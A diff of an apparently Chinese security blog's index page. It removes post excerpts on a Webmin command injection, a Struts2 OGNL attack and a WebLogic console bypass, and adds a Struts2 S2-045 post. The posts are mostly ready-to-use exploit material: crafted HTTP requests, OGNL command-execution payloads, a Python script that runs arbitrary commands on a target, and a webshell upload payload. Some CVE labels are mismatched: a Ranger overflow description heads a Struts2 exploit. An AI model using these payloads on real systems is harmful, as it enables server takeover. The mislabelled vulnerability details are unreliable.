@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610800214407.css">
+<link rel="stylesheet" href="/css/style.css?v=1610800778182.css">
 
     <!--[if lt IE 9]>
     
@@ -111,177 +111,6 @@
             
         </strong>
     </h3>
-    
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/23/CVE-2019-15017-Webmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-    		CVE-2019-15017-Webmin远程代码执行漏洞
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-23T01:28:40.000Z">2020-12-23</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>当用户开 Webmin 密码重置功能后，攻击者利用该漏洞可在易受损系统中执行任意命令，进而获取系统 Shell。由于Webmin 中 Password_Change.cgi 在接收请求的处理过程中，old 参数存在命令注入漏洞，可被攻击者恶意利用。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Webmin 1.920及以下版本。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>vulhub拉取镜像，访问镜像地址<code>https://192.168.70.137:10000/</code>忽略证书风险<br><img src="/2020/12/23/CVE-2019-15017-Webmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>抓包，POST数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:10000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;your-ip:10000&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxx&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;test|id&amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure>
-<p>也可以使用脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-15107</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/12/23/CVE-2019-15017-Webmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p>
-<p><img src="/2020/12/23/CVE-2019-15017-Webmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p>
-
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/23/CVE-2019-15017-Webmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/23/CVE-2019-15017-Webmin%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2019-15017-Webmin远程代码执行漏洞">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-    		CVE-2018-11776_Ranger 远程代码执行漏洞
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-21T12:58:40.000Z">2020-12-21</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Ranger 是美国阿帕奇（Apache）软件基金会的一套为 Hadoop集群实现全面安全措施的架构，它针对授权、结算和数据保护等核心企业安全要求，提供中央安全政策管理。Unix Authentication Service 是其中的一个身份验证服务组件。 Apache Ranger 1.2.0 之前版本中的 Unix Authentication Service 存在基于栈的缓冲区溢出漏洞，该漏洞源于程序没有正确的执行边界检查。远程攻击者可通过发送特制的请求利用该漏洞在系统上执行任意代码。</p>
-<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>启动靶机，访问镜像地址<a target="_blank" rel="noopener" href="http://8.131.79.166:19602/struts2-showcase/">http://8.131.79.166:19602/struts2-showcase/</a><br><img src="/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>抓包，构造如下访问链接<br>/struts2-showcase/$%7B10*10%7D/actionChain1.action<br><img src="/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"><br>在返回包的Location字段出现结果，说明漏洞存在<br>接着构造POC链接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;struts2-showcase&#x2F;$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B&#39;struts.valueStack&#39;%5D.context).(%23cr%3D%23ct%5B&#39;com.opensymphony.xwork2.ActionContext.container&#39;%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;ls%20&#x2F;tmp&#39;)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D&#x2F;actionChain1.action HTTP&#x2F;1.1</span><br><span class="line">Host: 8.131.79.166:19602</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjA0ODgxNzY5LCJlbWFpbCI6ImFkbWluQGZvZmEuc28ifQ.CKyZHCE5upK_ZPuijSRV8vik48zqA1h-f8-uDOXhGL0; JSESSIONID&#x3D;17587D5BCEE0092AF3142A31A4263861</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"><br><img src="/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p>
-
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/21/CVE-2018-11776-Ranger-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2018-11776_Ranger 远程代码执行漏洞">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/1.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-    		CVE-2020-14882&amp;CVE-2020-14883WeblogicHttpConsole权限绕过&amp;命令执行
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-21T08:16:26.000Z">2020-12-21</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/POC/" title="POC">POC</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2020-14883通过HTTP请求绕过用户身份鉴定，对高权限的后台Console进行访问</p>
-<p>CVE-2020-14882通过高权限的后台Console进行远程命令执行</p>
-<p>两个漏洞可以组合使用，权限绕过后进行远程命令执行</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 10.3.6.0.0</span><br><span class="line"></span><br><span class="line">Weblogic 12.1.3.0.0</span><br><span class="line"></span><br><span class="line">Weblogic 12.2.1.3.0</span><br><span class="line"></span><br><span class="line">Weblogic 12.2.1.4.0</span><br><span class="line"></span><br><span class="line">Weblogic 14.1.1.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;images&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>
-<p>更换路径的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>
-<h4 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%252E%252E%252Fconsole.portal</span><br></pre></td></tr></table></figure>
-<p>访问路径即可访问后台Console</p>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/21/CVE-2020-14882-CVE-2020-14883WeblogicHttpConsole%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CVE-2020-14882&amp;CVE-2020-14883WeblogicHttpConsole权限绕过&amp;命令执行">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/1.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -650,6 +479,165 @@
 </article>
 
     
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/">
+    		CVE-2017-5638 Struts2 S2-045远程代码执行漏洞POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T11:38:47.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p>
+<h2 id="漏洞验证POC"><a href="#漏洞验证POC" class="headerlink" title="漏洞验证POC"></a>漏洞验证POC</h2><p>在/*.action页面抓包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:%&#123;(#test&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(10*10*10)).(#ros.flush())&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>返回包如果返回了10x10x10的结果，则证明此漏洞存在</p>
+<h2 id="漏洞验证EXP"><a href="#漏洞验证EXP" class="headerlink" title="漏洞验证EXP"></a>漏洞验证EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">!&#x2F;usr&#x2F;bin&#x2F;py2</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import httplib</span><br><span class="line">def poc(url):</span><br><span class="line">    httplib.HTTPConnection._http_vsn_str&#x3D;&#39;HTTP&#x2F;1.0&#39;</span><br><span class="line">    payload &#x3D; &quot;%&#123;(#test&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(10*10)).(#ros.flush())&#125;&quot;</span><br><span class="line">    headers &#x3D; &#123;&#125;</span><br><span class="line">    headers[&quot;Content-Type&quot;] &#x3D; payload</span><br><span class="line">    r &#x3D; requests.get(url, headers&#x3D;headers)</span><br><span class="line">    if &quot;100&quot; in r.content:</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        print &quot;python s2-045.py target&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line">    elif poc(sys.argv[1]):</span><br><span class="line">        print &quot;vulnerable&quot;</span><br><span class="line">    else:</span><br><span class="line">        print &quot;not vulnerable&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="命令执行POC"><a href="#命令执行POC" class="headerlink" title="命令执行POC"></a>命令执行POC</h2><p>同样在action页面抓包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:%&#123;(#nike&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="命令执行EXP"><a href="#命令执行EXP" class="headerlink" title="命令执行EXP"></a>命令执行EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import httplib</span><br><span class="line"></span><br><span class="line">def exploit(url, cmd):</span><br><span class="line">    payload &#x3D; &quot;%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#_memberAccess?&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#_memberAccess&#x3D;#dm):&quot;</span><br><span class="line">    payload +&#x3D; &quot;((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#ognlUtil.getExcludedClasses().clear()).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#context.setMemberAccess(#dm)))).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#cmd&#x3D;&#39;%s&#39;).&quot; % cmd</span><br><span class="line">    payload +&#x3D; &quot;(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;</span><br><span class="line">    payload +&#x3D; &quot;(#ros.flush())&#125;&quot;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        headers &#x3D; &#123;&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0&#39;, &#39;Content-Type&#39;: payload&#125;</span><br><span class="line">        request &#x3D; urllib2.Request(url, headers&#x3D;headers)</span><br><span class="line">        page &#x3D; urllib2.urlopen(request).read()</span><br><span class="line">    except httplib.IncompleteRead, e:</span><br><span class="line">        page &#x3D; e.partial</span><br><span class="line"></span><br><span class="line">    print(page)</span><br><span class="line">    return page</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    import sys</span><br><span class="line">    if len(sys.argv) !&#x3D; 3:</span><br><span class="line">        print(&quot;[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;[*] CVE: 2017-5638 - Apache Struts2 S2-045&#39;)</span><br><span class="line">        url &#x3D; sys.argv[1]</span><br><span class="line">        cmd &#x3D; sys.argv[2]</span><br><span class="line">        print(&quot;[*] cmd: %s\n&quot; % cmd)</span><br><span class="line">        exploit(url, cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="文件上传Getshell-POC"><a href="#文件上传Getshell-POC" class="headerlink" title="文件上传Getshell POC"></a>文件上传Getshell POC</h2><p>抓包，GET方式改为PUT，添加参数?f=a.jsp，内容为要上传的内容即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_multipart&#x2F;form-data%&#123;(#o&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#o):((#c&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#g&#x3D;#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest()).(#f&#x3D;new java.io.File(#req.getRealPath(&#39;&#x2F;&#39;),#req.getParameter(&#39;f&#39;))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/1.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-5638-Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2017-5638 Struts2 S2-045远程代码执行漏洞POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    		CVE-2017-4917 Spring WebFlow远程代码执行漏洞
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T11:36:53.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
